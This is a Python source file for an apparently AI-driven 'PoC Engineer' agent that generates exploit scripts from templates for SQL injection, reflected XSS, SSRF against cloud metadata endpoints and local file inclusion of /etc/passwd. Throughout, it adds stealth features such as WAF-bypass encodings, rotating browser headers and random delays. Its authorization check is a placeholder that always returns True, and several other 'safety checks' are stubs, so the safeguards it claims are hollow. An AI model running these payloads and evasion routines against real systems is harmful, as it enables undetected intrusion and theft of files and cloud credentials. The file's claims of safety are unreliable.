#!/usr/bin/env python3
"""
AEGIS-X PoC Engineer Agent
Weapon Builder - Creates safe, stealthy proof-of-concept exploits
"""

import os
import json
import logging
import asyncio
import hashlib
import base64
from typing import Dict, List, Any, Optional
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass

@dataclass
class PoCTemplate:
    """Template for generating proof-of-concept exploits"""
    name: str
    vulnerability_type: str
    language: str
    template_code: str
    parameters: List[str]
    safety_checks: List[str]
    evasion_techniques: List[str]

class PoCEngineer:
    """
    The PoC Engineer creates safe, effective proof-of-concept exploits
    that demonstrate vulnerabilities without causing damage.
    """
    
    def __init__(self):
        self.logger = logging.getLogger("AEGIS-X.PoCEngineer")
        self.model_name = "WizardCoder-15B.Q5_K_M"
        self.learning_data = self._load_learning_data()
        
        # PoC templates for different vulnerability types
        self.poc_templates = self._initialize_poc_templates()
        self.evasion_techniques = self._initialize_evasion_techniques()
        self.safety_guidelines = self._initialize_safety_guidelines()
        
        self.logger.info("🛠️ PoC Engineer initialized with exploit generation capabilities")
    
    def _load_learning_data(self) -> Dict[str, Any]:
        """Load learning data from previous PoC generation sessions"""
        learning_file = Path("learn/poc_learning.json")
        
        if learning_file.exists():
            try:
                with open(learning_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                self.logger.warning(f"Failed to load PoC learning data: {e}")
        
        return {
            "successful_pocs": [],
            "failed_pocs": [],
            "template_effectiveness": {},
            "evasion_success_rates": {},
            "improvement_notes": []
        }
    
    def _initialize_poc_templates(self) -> Dict[str, PoCTemplate]:
        """Initialize PoC templates for different vulnerability types"""
        return {
            "sql_injection": PoCTemplate(
                name="SQL Injection PoC",
                vulnerability_type="sql_injection",
                language="python",
                template_code="""
import requests
import urllib.parse
import time
import random

def test_sql_injection(target_url, parameter, payload_type="union"):
    \"\"\"
    Safe SQL injection test - only retrieves database version
    \"\"\"
    
    # Safety check - only test on authorized targets
    if not is_authorized_target(target_url):
        return {"error": "Unauthorized target"}
    
    payloads = {
        "union": "' UNION SELECT version(),user(),database()-- ",
        "error": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
        "time": "' AND (SELECT * FROM (SELECT SLEEP(5))a)-- "
    }
    
    payload = payloads.get(payload_type, payloads["union"])
    
    # Apply evasion techniques
    payload = apply_evasion(payload)
    
    # Prepare request with safety measures
    data = {parameter: payload}
    headers = get_random_headers()
    
    try:
        # Add random delay for stealth
        time.sleep(random.uniform(1, 3))
        
        response = requests.post(target_url, data=data, headers=headers, timeout=10)
        
        # Analyze response for SQL injection indicators
        indicators = ["mysql", "postgresql", "oracle", "sql syntax", "database error"]
        
        for indicator in indicators:
            if indicator.lower() in response.text.lower():
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "indicator": indicator
                }
        
        return {"vulnerable": False, "payload": payload}
        
    except Exception as e:
        return {"error": str(e)}

def is_authorized_target(url):
    \"\"\"Check if target is authorized for testing\"\"\"
    # Implement authorization check logic
    return True  # Placeholder

def apply_evasion(payload):
    \"\"\"Apply evasion techniques to payload\"\"\"
    # URL encoding
    payload = urllib.parse.quote(payload)
    return payload

def get_random_headers():
    \"\"\"Generate random headers for evasion\"\"\"
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ]
    
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive"
    }
""",
                parameters=["target_url", "parameter", "payload_type"],
                safety_checks=["is_authorized_target", "timeout_limits", "non_destructive_payloads"],
                evasion_techniques=["url_encoding", "random_headers", "timing_delays"]
            ),
            
            "xss_reflected": PoCTemplate(
                name="Reflected XSS PoC",
                vulnerability_type="xss_reflected",
                language="python",
                template_code="""
import requests
import urllib.parse
import time
import random
import hashlib

def test_reflected_xss(target_url, parameter):
    \"\"\"
    Safe reflected XSS test using unique identifiers
    \"\"\"
    
    # Generate unique identifier for this test
    test_id = hashlib.md5(f"{target_url}{parameter}{time.time()}".encode()).hexdigest()[:8]
    
    # Safe XSS payloads that don't execute harmful code
    payloads = [
        f"<script>console.log('XSS-{test_id}')</script>",
        f"<img src=x onerror=console.log('XSS-{test_id}')>",
        f"javascript:console.log('XSS-{test_id}')",
        f"<svg onload=console.log('XSS-{test_id}')>",
        f"'><script>console.log('XSS-{test_id}')</script>"
    ]
    
    results = []
    
    for payload in payloads:
        # Apply evasion techniques
        evaded_payload = apply_xss_evasion(payload)
        
        # Prepare request
        params = {parameter: evaded_payload}
        headers = get_stealth_headers()
        
        try:
            # Random delay for stealth
            time.sleep(random.uniform(0.5, 2.0))
            
            response = requests.get(target_url, params=params, headers=headers, timeout=10)
            
            # Check if payload is reflected without encoding
            if test_id in response.text and ("<script>" in response.text or "onerror=" in response.text):
                results.append({
                    "vulnerable": True,
                    "payload": payload,
                    "evaded_payload": evaded_payload,
                    "test_id": test_id,
                    "response_snippet": response.text[:300]
                })
            
        except Exception as e:
            results.append({"error": str(e), "payload": payload})
    
    return results

def apply_xss_evasion(payload):
    \"\"\"Apply XSS evasion techniques\"\"\"
    # HTML entity encoding bypass
    payload = payload.replace("<", "%3C").replace(">", "%3E")
    
    # Double URL encoding
    payload = urllib.parse.quote(urllib.parse.quote(payload))
    
    return payload

def get_stealth_headers():
    \"\"\"Generate stealth headers\"\"\"
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
""",
                parameters=["target_url", "parameter"],
                safety_checks=["unique_identifiers", "console_log_only", "timeout_limits"],
                evasion_techniques=["html_encoding", "double_url_encoding", "stealth_headers"]
            ),
            
            "ssrf": PoCTemplate(
                name="SSRF PoC",
                vulnerability_type="ssrf",
                language="python",
                template_code="""
import requests
import time
import random

def test_ssrf(target_url, parameter):
    \"\"\"
    Safe SSRF test - only tests for internal network access
    \"\"\"
    
    # Safe SSRF test URLs (non-destructive)
    test_urls = [
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        "http://127.0.0.1:80",  # Localhost
        "http://localhost:22",  # SSH port
        "http://10.0.0.1",  # Internal network
        "file:///etc/passwd",  # Local file (read-only)
        "http://httpbin.org/ip"  # External service for confirmation
    ]
    
    results = []
    
    for test_url in test_urls:
        # Apply evasion techniques
        evaded_url = apply_ssrf_evasion(test_url)
        
        # Prepare request
        data = {parameter: evaded_url}
        headers = get_random_headers()
        
        try:
            # Random delay
            time.sleep(random.uniform(1, 3))
            
            response = requests.post(target_url, data=data, headers=headers, timeout=15)
            
            # Check for SSRF indicators
            indicators = analyze_ssrf_response(response, test_url)
            
            if indicators["vulnerable"]:
                results.append({
                    "vulnerable": True,
                    "test_url": test_url,
                    "evaded_url": evaded_url,
                    "indicators": indicators,
                    "response_snippet": response.text[:500]
                })
            
        except Exception as e:
            results.append({"error": str(e), "test_url": test_url})
    
    return results

def apply_ssrf_evasion(url):
    \"\"\"Apply SSRF evasion techniques\"\"\"
    # IP address obfuscation
    if "127.0.0.1" in url:
        # Use different representations of localhost
        alternatives = ["127.1", "0x7f000001", "2130706433", "localhost"]
        url = url.replace("127.0.0.1", random.choice(alternatives))
    
    # URL encoding
    url = urllib.parse.quote(url, safe=':/?#[]@!$&\'()*+,;=')
    
    return url

def analyze_ssrf_response(response, test_url):
    \"\"\"Analyze response for SSRF indicators\"\"\"
    indicators = {"vulnerable": False, "evidence": []}
    
    # AWS metadata indicators
    if "169.254.169.254" in test_url and "ami-id" in response.text.lower():
        indicators["vulnerable"] = True
        indicators["evidence"].append("AWS metadata accessible")
    
    # GCP metadata indicators
    if "metadata.google.internal" in test_url and "instance" in response.text.lower():
        indicators["vulnerable"] = True
        indicators["evidence"].append("GCP metadata accessible")
    
    # Internal service indicators
    if any(port in test_url for port in [":22", ":80", ":443"]) and len(response.text) > 0:
        indicators["vulnerable"] = True
        indicators["evidence"].append("Internal service accessible")
    
    # File access indicators
    if "file://" in test_url and ("root:" in response.text or "bin:" in response.text):
        indicators["vulnerable"] = True
        indicators["evidence"].append("Local file access")
    
    return indicators
""",
                parameters=["target_url", "parameter"],
                safety_checks=["read_only_operations", "timeout_limits", "non_destructive_urls"],
                evasion_techniques=["ip_obfuscation", "url_encoding", "localhost_alternatives"]
            ),
            
            "lfi": PoCTemplate(
                name="Local File Inclusion PoC",
                vulnerability_type="lfi",
                language="python",
                template_code="""
import requests
import urllib.parse
import time
import random

def test_lfi(target_url, parameter):
    \"\"\"
    Safe LFI test - only attempts to read common system files
    \"\"\"
    
    # Safe file paths for testing (read-only, non-sensitive)
    test_files = [
        "/etc/passwd",
        "/etc/hosts",
        "/proc/version",
        "/proc/cpuinfo",
        "../../../../etc/passwd",
        "..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "/var/log/apache2/access.log",
        "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
    ]
    
    results = []
    
    for file_path in test_files:
        # Apply evasion techniques
        evaded_path = apply_lfi_evasion(file_path)
        
        # Prepare request
        params = {parameter: evaded_path}
        headers = get_random_headers()
        
        try:
            # Random delay
            time.sleep(random.uniform(0.5, 2.0))
            
            response = requests.get(target_url, params=params, headers=headers, timeout=10)
            
            # Check for LFI indicators
            if is_lfi_successful(response, file_path):
                results.append({
                    "vulnerable": True,
                    "file_path": file_path,
                    "evaded_path": evaded_path,
                    "response_snippet": response.text[:300],
                    "file_type": detect_file_type(response.text)
                })
            
        except Exception as e:
            results.append({"error": str(e), "file_path": file_path})
    
    return results

def apply_lfi_evasion(file_path):
    \"\"\"Apply LFI evasion techniques\"\"\"
    # Null byte injection (for older PHP versions)
    if not file_path.endswith("%00"):
        file_path += "%00"
    
    # Double encoding
    file_path = urllib.parse.quote(urllib.parse.quote(file_path))
    
    # Path traversal variations
    file_path = file_path.replace("../", "%2e%2e%2f")
    
    return file_path

def is_lfi_successful(response, file_path):
    \"\"\"Check if LFI was successful\"\"\"
    # Check for common file content indicators
    if "/etc/passwd" in file_path:
        return "root:" in response.text and "/bin/" in response.text
    
    if "/etc/hosts" in file_path:
        return "localhost" in response.text or "127.0.0.1" in response.text
    
    if "/proc/version" in file_path:
        return "Linux version" in response.text
    
    if "windows" in file_path.lower():
        return "localhost" in response.text or "127.0.0.1" in response.text
    
    return False

def detect_file_type(content):
    \"\"\"Detect the type of file accessed\"\"\"
    if "root:" in content and "/bin/" in content:
        return "passwd_file"
    elif "localhost" in content:
        return "hosts_file"
    elif "Linux version" in content:
        return "version_file"
    else:
        return "unknown"
""",
                parameters=["target_url", "parameter"],
                safety_checks=["read_only_files", "timeout_limits", "non_sensitive_paths"],
                evasion_techniques=["null_byte_injection", "double_encoding", "path_traversal_variations"]
            )
        }
    
    def _initialize_evasion_techniques(self) -> Dict[str, Dict[str, Any]]:
        """Initialize evasion techniques for different scenarios"""
        return {
            "waf_bypass": {
                "techniques": [
                    "case_variation",
                    "encoding_variations",
                    "comment_insertion",
                    "whitespace_manipulation",
                    "parameter_pollution"
                ],
                "implementations": {
                    "case_variation": lambda payload: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)),
                    "encoding_variations": lambda payload: urllib.parse.quote(payload),
                    "comment_insertion": lambda payload: payload.replace(" ", "/**/"),
                    "whitespace_manipulation": lambda payload: payload.replace(" ", "\t").replace("\n", "\r\n")
                }
            },
            "rate_limiting": {
                "techniques": [
                    "random_delays",
                    "distributed_requests",
                    "header_rotation",
                    "proxy_rotation"
                ],
                "implementations": {
                    "random_delays": lambda: time.sleep(random.uniform(1, 5)),
                    "header_rotation": lambda: self._get_random_headers()
                }
            },
            "detection_avoidance": {
                "techniques": [
                    "legitimate_user_simulation",
                    "browser_automation",
                    "session_management",
                    "cookie_handling"
                ]
            }
        }
    
    def _initialize_safety_guidelines(self) -> Dict[str, List[str]]:
        """Initialize safety guidelines for PoC generation"""
        return {
            "general": [
                "Never execute destructive operations",
                "Always use read-only operations when possible",
                "Implement proper timeout mechanisms",
                "Use unique identifiers for tracking",
                "Respect rate limits and implement delays",
                "Only test on authorized targets"
            ],
            "sql_injection": [
                "Only retrieve database version and basic info",
                "Never attempt to modify data",
                "Use UNION SELECT with safe columns",
                "Avoid DROP, DELETE, UPDATE operations",
                "Implement query timeouts"
            ],
            "xss": [
                "Use console.log instead of alert()",
                "Never execute malicious JavaScript",
                "Use unique identifiers for tracking",
                "Avoid DOM manipulation",
                "Test in isolated contexts"
            ],
            "ssrf": [
                "Only test for read access",
                "Avoid destructive internal services",
                "Use safe metadata endpoints",
                "Implement request timeouts",
                "Test with non-sensitive internal IPs"
            ],
            "file_inclusion": [
                "Only read common system files",
                "Avoid sensitive configuration files",
                "Use read-only file paths",
                "Implement file size limits",
                "Never attempt file writes"
            ]
        }
    
    async def generate_poc(self, vulnerability: Dict[str, Any], requirements: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Generate a safe, effective proof-of-concept exploit
        """
        self.logger.info(f"🛠️ Generating PoC for: {vulnerability.get('title', 'Unknown')}")
        
        # Classify vulnerability type
        vuln_type = self._classify_vulnerability_type(vulnerability)
        
        # Get appropriate template
        template = self.poc_templates.get(vuln_type)
        if not template:
            return await self._generate_custom_poc(vulnerability, requirements)
        
        # Apply self-reflection
        reflection_result = self._apply_poc_reflection(vulnerability, template, requirements)
        
        # Generate PoC code
        poc_code = await self._customize_template(template, vulnerability, requirements)
        
        # Add safety checks
        safe_poc = self._add_safety_checks(poc_code, template.safety_checks)
        
        # Apply evasion techniques
        stealthy_poc = self._apply_evasion_techniques(safe_poc, template.evasion_techniques)
        
        # Generate usage instructions
        instructions = self._generate_usage_instructions(template, vulnerability)
        
        poc_result = {
            "vulnerability_type": vuln_type,
            "template_used": template.name,
            "poc_code": stealthy_poc,
            "language": template.language,
            "safety_checks": template.safety_checks,
            "evasion_techniques": template.evasion_techniques,
            "usage_instructions": instructions,
            "reflection_notes": reflection_result,
            "generated_at": datetime.now().isoformat()
        }
        
        # Store for learning
        await self._store_poc_learning(poc_result, vulnerability)
        
        return poc_result
    
    def _classify_vulnerability_type(self, vulnerability: Dict[str, Any]) -> str:
        """Classify vulnerability type for PoC generation"""
        title = vulnerability.get("title", "").lower()
        description = vulnerability.get("description", "").lower()
        
        combined_text = f"{title} {description}"
        
        # Classification patterns
        if any(term in combined_text for term in ["sql injection", "sqli", "sql"]):
            return "sql_injection"
        elif any(term in combined_text for term in ["xss", "cross-site scripting", "script injection"]):
            if "stored" in combined_text or "persistent" in combined_text:
                return "xss_stored"
            else:
                return "xss_reflected"
        elif any(term in combined_text for term in ["ssrf", "server-side request forgery"]):
            return "ssrf"
        elif any(term in combined_text for term in ["lfi", "local file inclusion", "file inclusion"]):
            return "lfi"
        elif any(term in combined_text for term in ["rfi", "remote file inclusion"]):
            return "rfi"
        elif any(term in combined_text for term in ["idor", "insecure direct object reference"]):
            return "idor"
        elif any(term in combined_text for term in ["csrf", "cross-site request forgery"]):
            return "csrf"
        elif any(term in combined_text for term in ["xxe", "xml external entity"]):
            return "xxe"
        else:
            return "custom"
    
    def _apply_poc_reflection(self, vulnerability: Dict[str, Any], template: PoCTemplate, requirements: Dict[str, Any]) -> List[str]:
        """Apply self-reflection to PoC generation"""
        reflection_questions = [
            "Is this exploit safe and non-destructive?",
            "Does it include proper error handling?",
            "Can I make it more stealthy?",
            "What improvements can I make based on past PoCs?",
            "Are all safety checks in place?"
        ]
        
        reflection_notes = []
        
        # Safety reflection
        if template and len(template.safety_checks) < 3:
            reflection_notes.append("Consider adding more safety checks to prevent accidental damage")
        
        # Stealth reflection
        if template and len(template.evasion_techniques) < 2:
            reflection_notes.append("Consider adding more evasion techniques for better stealth")
        
        # Effectiveness reflection
        vuln_type = template.vulnerability_type if template else "custom"
        past_success_rate = self.learning_data.get("template_effectiveness", {}).get(vuln_type, 0.5)
        
        if past_success_rate < 0.7:
            reflection_notes.append(f"Past success rate for {vuln_type} is {past_success_rate:.2f} - consider improvements")
        
        return reflection_notes
    
    async def _customize_template(self, template: PoCTemplate, vulnerability: Dict[str, Any], requirements: Dict[str, Any]) -> str:
        """Customize PoC template for specific vulnerability"""
        poc_code = template.template_code
        
        # Extract target information
        target = vulnerability.get("target", "")
        parameter = vulnerability.get("parameter", "")
        
        # Apply customizations based on vulnerability details
        if "parameter" in vulnerability:
            poc_code = poc_code.replace("PARAMETER_PLACEHOLDER", vulnerability["parameter"])
        
        if "target" in vulnerability:
            poc_code = poc_code.replace("TARGET_PLACEHOLDER", vulnerability["target"])
        
        # Add vulnerability-specific payloads
        if template.vulnerability_type == "sql_injection":
            poc_code = self._customize_sql_payloads(poc_code, vulnerability)
        elif template.vulnerability_type == "xss_reflected":
            poc_code = self._customize_xss_payloads(poc_code, vulnerability)
        
        return poc_code
    
    def _customize_sql_payloads(self, poc_code: str, vulnerability: Dict[str, Any]) -> str:
        """Customize SQL injection payloads based on database type"""
        # Detect database type from vulnerability details
        description = vulnerability.get("description", "").lower()
        
        if "mysql" in description:
            # Add MySQL-specific payloads
            mysql_payloads = [
                "' UNION SELECT version(),user(),database()-- ",
                "' AND (SELECT SUBSTRING(@@version,1,1))='5'-- "
            ]
            poc_code = poc_code.replace("# MySQL specific payloads", str(mysql_payloads))
        
        elif "postgresql" in description:
            # Add PostgreSQL-specific payloads
            postgres_payloads = [
                "' UNION SELECT version(),current_user,current_database()-- ",
                "' AND (SELECT version()) LIKE '%PostgreSQL%'-- "
            ]
            poc_code = poc_code.replace("# PostgreSQL specific payloads", str(postgres_payloads))
        
        return poc_code
    
    def _customize_xss_payloads(self, poc_code: str, vulnerability: Dict[str, Any]) -> str:
        """Customize XSS payloads based on context"""
        context = vulnerability.get("context", "").lower()
        
        if "attribute" in context:
            # Add attribute-based XSS payloads
            attr_payloads = [
                "\" onmouseover=console.log('XSS') \"",
                "' onfocus=console.log('XSS') autofocus '"
            ]
            poc_code = poc_code.replace("# Attribute context payloads", str(attr_payloads))
        
        elif "javascript" in context:
            # Add JavaScript context payloads
            js_payloads = [
                "';console.log('XSS');//",
                "\";console.log('XSS');//"
            ]
            poc_code = poc_code.replace("# JavaScript context payloads", str(js_payloads))
        
        return poc_code
    
    def _add_safety_checks(self, poc_code: str, safety_checks: List[str]) -> str:
        """Add safety checks to PoC code"""
        safety_code = """
# SAFETY CHECKS - DO NOT REMOVE
def verify_safety_conditions():
    \"\"\"Verify all safety conditions before execution\"\"\"
    checks = {
"""
        
        for check in safety_checks:
            if check == "is_authorized_target":
                safety_code += """
        "authorized_target": lambda url: input(f"Confirm testing authorization for {url} (y/N): ").lower() == 'y',"""
            elif check == "timeout_limits":
                safety_code += """
        "timeout_limits": lambda: True,  # Timeouts implemented in requests"""
            elif check == "non_destructive_payloads":
                safety_code += """
        "non_destructive": lambda: True,  # Only read operations used"""
        
        safety_code += """
    }
    
    for check_name, check_func in checks.items():
        if not check_func():
            raise Exception(f"Safety check failed: {check_name}")
    
    return True

# Verify safety before execution
verify_safety_conditions()
"""
        
        return safety_code + "\n" + poc_code
    
    def _apply_evasion_techniques(self, poc_code: str, evasion_techniques: List[str]) -> str:
        """Apply evasion techniques to PoC code"""
        evasion_code = """
# EVASION TECHNIQUES
import random
import time
import urllib.parse

def apply_evasion_techniques():
    \"\"\"Apply various evasion techniques\"\"\"
    techniques = {
"""
        
        for technique in evasion_techniques:
            if technique == "random_headers":
                evasion_code += """
        "random_headers": get_random_headers,"""
            elif technique == "timing_delays":
                evasion_code += """
        "timing_delays": lambda: time.sleep(random.uniform(1, 3)),"""
            elif technique == "url_encoding":
                evasion_code += """
        "url_encoding": lambda payload: urllib.parse.quote(payload),"""
        
        evasion_code += """
    }
    return techniques

# Initialize evasion techniques
evasion_techniques = apply_evasion_techniques()
"""
        
        return evasion_code + "\n" + poc_code
    
    def _generate_usage_instructions(self, template: PoCTemplate, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Generate usage instructions for the PoC"""
        return {
            "description": f"Proof-of-concept for {template.vulnerability_type} vulnerability",
            "prerequisites": [
                "Python 3.6+ with requests library",
                "Authorization to test the target",
                "Network access to target"
            ],
            "usage": f"python3 poc_{template.vulnerability_type}.py",
            "parameters": template.parameters,
            "safety_notes": [
                "This PoC is designed to be safe and non-destructive",
                "Always obtain proper authorization before testing",
                "Monitor your testing to avoid excessive requests",
                "Review the code before execution"
            ],
            "expected_output": "Vulnerability confirmation with evidence",
            "troubleshooting": [
                "If no results, check target accessibility",
                "Verify parameter names are correct",
                "Check for WAF or rate limiting",
                "Review evasion techniques if blocked"
            ]
        }
    
    async def _generate_custom_poc(self, vulnerability: Dict[str, Any], requirements: Dict[str, Any]) -> Dict[str, Any]:
        """Generate custom PoC for unknown vulnerability types"""
        self.logger.info("🔧 Generating custom PoC for unknown vulnerability type")
        
        # Analyze vulnerability to determine approach
        vuln_analysis = self._analyze_custom_vulnerability(vulnerability)
        
        # Generate basic PoC structure
        custom_poc = self._create_custom_poc_structure(vuln_analysis)
        
        return {
            "vulnerability_type": "custom",
            "template_used": "custom_generated",
            "poc_code": custom_poc,
            "language": "python",
            "safety_checks": ["authorization_check", "timeout_limits"],
            "evasion_techniques": ["random_headers", "timing_delays"],
            "usage_instructions": self._generate_custom_instructions(vuln_analysis),
            "generated_at": datetime.now().isoformat(),
            "custom_analysis": vuln_analysis
        }
    
    def _analyze_custom_vulnerability(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze custom vulnerability to determine PoC approach"""
        title = vulnerability.get("title", "")
        description = vulnerability.get("description", "")
        
        analysis = {
            "attack_vector": "unknown",
            "input_method": "unknown",
            "expected_response": "unknown",
            "risk_level": "medium"
        }
        
        # Determine attack vector
        if any(term in description.lower() for term in ["parameter", "input", "form"]):
            analysis["attack_vector"] = "parameter_injection"
            analysis["input_method"] = "http_parameter"
        elif any(term in description.lower() for term in ["header", "cookie"]):
            analysis["attack_vector"] = "header_injection"
            analysis["input_method"] = "http_header"
        elif any(term in description.lower() for term in ["file", "upload"]):
            analysis["attack_vector"] = "file_upload"
            analysis["input_method"] = "file_upload"
        
        return analysis
    
    def _create_custom_poc_structure(self, analysis: Dict[str, Any]) -> str:
        """Create custom PoC structure based on analysis"""
        return f"""
import requests
import time
import random

def test_custom_vulnerability(target_url, test_parameter=None):
    \"\"\"
    Custom vulnerability test based on analysis
    Attack Vector: {analysis['attack_vector']}
    Input Method: {analysis['input_method']}
    \"\"\"
    
    # Safety check
    if not input(f"Confirm authorization to test {{target_url}} (y/N): ").lower() == 'y':
        return {{"error": "Testing not authorized"}}
    
    # Prepare test payloads based on analysis
    test_payloads = generate_test_payloads("{analysis['attack_vector']}")
    
    results = []
    
    for payload in test_payloads:
        try:
            # Apply evasion
            headers = get_random_headers()
            time.sleep(random.uniform(1, 3))
            
            # Execute test based on input method
            if "{analysis['input_method']}" == "http_parameter":
                response = requests.get(target_url, params={{test_parameter: payload}}, headers=headers, timeout=10)
            elif "{analysis['input_method']}" == "http_header":
                headers[test_parameter] = payload
                response = requests.get(target_url, headers=headers, timeout=10)
            else:
                response = requests.get(target_url, headers=headers, timeout=10)
            
            # Analyze response
            if analyze_response(response, payload):
                results.append({{"vulnerable": True, "payload": payload, "response": response.text[:300]}})
            
        except Exception as e:
            results.append({{"error": str(e), "payload": payload}})
    
    return results

def generate_test_payloads(attack_vector):
    \"\"\"Generate test payloads based on attack vector\"\"\"
    if attack_vector == "parameter_injection":
        return ["'", '"', "<script>", "{{7*7}}", "${{7*7}}"]
    elif attack_vector == "header_injection":
        return ["\\r\\nInjected: header", "\\nX-Injected: true"]
    else:
        return ["test_payload"]

def analyze_response(response, payload):
    \"\"\"Analyze response for vulnerability indicators\"\"\"
    # Basic analysis - customize based on vulnerability type
    return payload in response.text or len(response.text) != len(requests.get(response.url).text)

def get_random_headers():
    \"\"\"Generate random headers for evasion\"\"\"
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    ]
    return {{"User-Agent": random.choice(user_agents)}}
"""
    
    def _generate_custom_instructions(self, analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Generate instructions for custom PoC"""
        return {
            "description": f"Custom PoC for {analysis['attack_vector']} vulnerability",
            "prerequisites": ["Python 3.6+", "requests library", "target authorization"],
            "usage": "python3 custom_poc.py",
            "parameters": ["target_url", "test_parameter"],
            "analysis": analysis,
            "safety_notes": ["Custom PoC - review code before execution", "Ensure proper authorization"]
        }
    
    async def _store_poc_learning(self, poc_result: Dict[str, Any], vulnerability: Dict[str, Any]):
        """Store PoC generation learning data"""
        learning_entry = {
            "vulnerability_type": poc_result["vulnerability_type"],
            "template_used": poc_result["template_used"],
            "generation_time": poc_result["generated_at"],
            "safety_checks_count": len(poc_result["safety_checks"]),
            "evasion_techniques_count": len(poc_result["evasion_techniques"]),
            "reflection_notes": poc_result.get("reflection_notes", []),
            "vulnerability_details": {
                "title": vulnerability.get("title"),
                "severity": vulnerability.get("severity")
            }
        }
        
        self.learning_data.setdefault("poc_generations", []).append(learning_entry)
        
        # Save learning data
        learning_file = Path("learn/poc_learning.json")
        learning_file.parent.mkdir(exist_ok=True)
        
        try:
            with open(learning_file, 'w') as f:
                json.dump(self.learning_data, f, indent=2)
        except Exception as e:
            self.logger.warning(f"Failed to save PoC learning data: {e}")
    
    def _get_random_headers(self) -> Dict[str, str]:
        """Generate random headers for evasion"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        
        return {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none"
        }

# Import required modules at the top
import urllib.parse
import time
import random